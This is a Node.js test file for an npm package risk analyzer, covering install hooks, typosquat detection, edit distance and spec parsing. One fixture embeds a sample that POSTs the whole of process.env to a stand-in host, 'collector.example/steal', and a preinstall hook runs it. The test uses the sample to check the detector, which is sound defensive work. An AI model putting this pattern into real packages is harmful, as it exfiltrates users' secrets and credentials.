import { test } from "node:test";
import assert from "node:assert/strict";
import { analyze } from "../src/analyze.js";
import { editDistance, typosquatTarget } from "../src/typosquat.js";
import { parseSpec } from "../src/registry.js";

const NOW = Date.now();
const daysAgo = (n) => new Date(NOW - n * 86_400_000).toISOString();

function fakePackage(overrides = {}) {
  return {
    name: "some-established-tool",
    version: "2.0.0",
    manifest: { scripts: {}, dependencies: {} },
    files: [],
    weeklyDownloads: 50_000,
    createdAt: daysAgo(900),
    versionPublishedAt: daysAgo(200),
    maintainers: [{ name: "a" }, { name: "b" }],
    readme: "x".repeat(500),
    ...overrides,
  };
}

test("clean established package is low-risk", () => {
  const report = analyze(fakePackage());
  assert.equal(report.verdict, "low-risk");
  assert.equal(report.findings.length, 0);
});

test("install hooks raise the score", () => {
  const report = analyze(
    fakePackage({
      manifest: { scripts: { postinstall: "node evil.js" }, dependencies: {} },
    }),
  );
  assert.equal(report.verdict, "caution");
  assert.match(report.findings[0].title, /postinstall/);
});

test("brand-new package with env+network exfil pattern is suspicious", () => {
  const source = `
    const data = JSON.stringify(process.env);
    fetch("https://collector.example/steal", { method: "POST", body: data });
  `;
  const report = analyze(
    fakePackage({
      createdAt: daysAgo(2),
      versionPublishedAt: daysAgo(1),
      weeklyDownloads: 12,
      maintainers: [{ name: "solo" }],
      readme: null,
      manifest: { scripts: { preinstall: "node index.js" }, dependencies: {} },
      files: [{ name: "package/index.js", size: source.length, data: Buffer.from(source) }],
    }),
  );
  assert.equal(report.verdict, "suspicious");
  assert.ok(report.score >= 50);
});

test("typosquat of a popular name is flagged", () => {
  const report = analyze(fakePackage({ name: "expresss" }));
  assert.ok(report.findings.some((f) => /typosquat|edits from/.test(f.title + f.detail)));
});

test("editDistance handles transpositions", () => {
  assert.equal(editDistance("react", "raect"), 1);
  assert.equal(editDistance("lodash", "lodash"), 0);
});

test("popular packages are not their own typosquat", () => {
  assert.equal(typosquatTarget("react"), null);
  assert.equal(typosquatTarget("raect"), "react");
});

test("parseSpec splits scoped and versioned specs", () => {
  assert.deepEqual(parseSpec("react@18.2.0"), { name: "react", range: "18.2.0" });
  assert.deepEqual(parseSpec("@scope/pkg@1.0.0"), { name: "@scope/pkg", range: "1.0.0" });
  assert.deepEqual(parseSpec("react"), { name: "react", range: "latest" });
});
